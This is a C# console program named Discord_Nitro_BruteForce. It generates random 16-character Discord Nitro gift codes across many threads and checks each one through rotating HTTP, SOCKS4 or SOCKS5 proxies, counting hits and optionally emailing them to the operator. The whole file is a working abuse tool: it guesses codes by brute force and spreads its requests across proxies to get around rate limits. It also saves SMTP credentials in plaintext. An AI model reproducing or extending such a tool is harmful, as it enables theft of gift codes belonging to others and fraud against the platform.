using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using Leaf.xNet;
using System.ComponentModel;
using System.CodeDom;
using System.Collections.Concurrent;

namespace Discord_Nitro_BruteForce
{
    class Program
    {
        static Random random = new Random();
        public static int goods = 0;
        public static int ch = 0;
        static bool work = false;
        static ProxyQueue proxies;
        static int proxyType;
        public static bool verbose = false;

        public static bool emailnotification = false;
        static string username;
        static string password;
        static string myemail;
        static string email;
        static string smtpserver;

        [STAThread]
        static void Main(string[] args)
        {

            Thread counter = new Thread(setTitle)
            {
                IsBackground = false
            };
            counter.Start();

            int threads;

            Console.Write("Enter count of threads: ");
            try
            {
                threads = int.Parse(Console.ReadLine().Trim());
            }
            catch
            {
                Console.WriteLine("Unknown threads count. Using 100");
                threads = 100;
            }

            while (true)
            {

                Console.WriteLine("Select proxy type:\r\n1. Http/s\r\n2. Socks4\r\n3. Socks5");
                Console.Write("Your choice: ");
                ConsoleKey k = Console.ReadKey().Key;
                Console.WriteLine();
                if (k == ConsoleKey.D1)
                {
                    Console.WriteLine("Selected Http/s type of proxy");
                    proxyType = 1;
                    break;
                }
                else if (k == ConsoleKey.D2)
                {
                    Console.WriteLine("Selected Socks4 type of proxy");
                    proxyType = 2;
                    break; 
                }
                else if (k == ConsoleKey.D3)
                {
                    Console.WriteLine("Selected Socks5 type of proxy");
                    proxyType = 3;
                    break;
                }
                Console.Clear();
            }

            Console.WriteLine("Open file with proxy list");

            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Filter = "Proxy list (*.txt)|*.txt";

            if (dialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }

            string proxyPath = dialog.FileName;

            proxies = new ProxyQueue(File.ReadAllLines(proxyPath));
            Console.WriteLine($"Loaded {proxies.Length} proxies");

            Console.Write("Use email notification? (y/n): ");
            if (Console.ReadLine().ToLower().Trim() == "y")
            {
                emailnotification = true;

                bool cfgLoad = false;

                if (File.Exists("email.cfg"))
                {
                    Console.Write("Use saved email config? (y/n): ");
                    cfgLoad = Console.ReadLine().ToLower().Trim() == "y";
                }

                if (cfgLoad)
                {
                    LoginParse();
                    
                    Console.WriteLine("File loaded!");

                    SendEmail("I'm only testing bro", "Test email!");
                }
                else
                {
                    Console.WriteLine("Enter smtp server: ");
                    smtpserver = Console.ReadLine();
                    Console.WriteLine("Enter username: ");
                    username = Console.ReadLine();
                    Console.WriteLine("Enter password: ");
                    password = Console.ReadLine();
                    Console.WriteLine("Enter email: ");
                    myemail = Console.ReadLine();
                    Console.WriteLine("Enter target email: ");
                    email = Console.ReadLine();

                    File.WriteAllText("email.cfg", string.Join("\r\n", new[] { username, password, email, myemail, smtpserver }));
                }
            }

            Console.Write("Show bad/error codes? (y/n): ");
            verbose = Console.ReadLine().ToLower().Trim() == "y";

            Console.Clear();

            work = true;

            List<Thread> workers = new List<Thread>();

            for (int i = 0; i < threads; i++)
            {
                Thread t = new Thread(Worker);
                t.Start();
                workers.Add(t);
            }

            while (true)
            {
                if (Console.ReadLine().Trim().ToLower() == "stop")
                {
                    Console.WriteLine("Stopping threads...");
                    work = false;
                    foreach(Thread t in workers)
                    {
                        t.Join();
                    }
                    break;
                }
            }

            Console.WriteLine("All threads stopped!");
            Console.ReadKey();
        }

        static void Worker()
        {
            string code = GenerateCode();
            while (work)
            {
                try
                {
                    Checker.Check(code, getNewProxy());
                }
                catch (HttpException)
                {
                    continue;
                }
                catch(Exception e)
                {
                    Console.WriteLine(e);
                }
                code = GenerateCode();
            }
        }

        static ProxyClient getNewProxy()
        {
            string fullP = proxies.Next();
                
            switch (proxyType)
            {
                case 1:
                        return HttpProxyClient.Parse(fullP);
                case 2:
                        return Socks4ProxyClient.Parse(fullP);
                case 3:
                        return Socks5ProxyClient.Parse(fullP);
                default:
                        return HttpProxyClient.Parse(fullP);
            }
        }

        static string GenerateCode()
        {
            string code = "";
            string dict = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";

            for(int i = 0; i < 16; i++)
            {
                code += dict[random.Next(0, dict.Length - 1)];
            }

            return code;
        }

        static void setTitle()
        {
            while (true)
            {
                string text = "idle";
                if (work)
                {
                    text = $"work Checked: {ch}, Hits: {goods}";
                }

                Console.Title = $"DNBF - {text}";
            }
        }

        public static void SendEmail(string context, string subject)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient(smtpserver);

            mail.From = new MailAddress(myemail);
            mail.To.Add(email);
            mail.Subject = subject;
            mail.Body = context;

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential(username, password);
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
        }

        static void LoginParse()
        {
            var lines = File.ReadAllLines("email.cfg");

            try
            {
                username = lines[0];
                password = lines[1];
                email = lines[2];
                myemail = lines[3];
                smtpserver = lines[4];
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
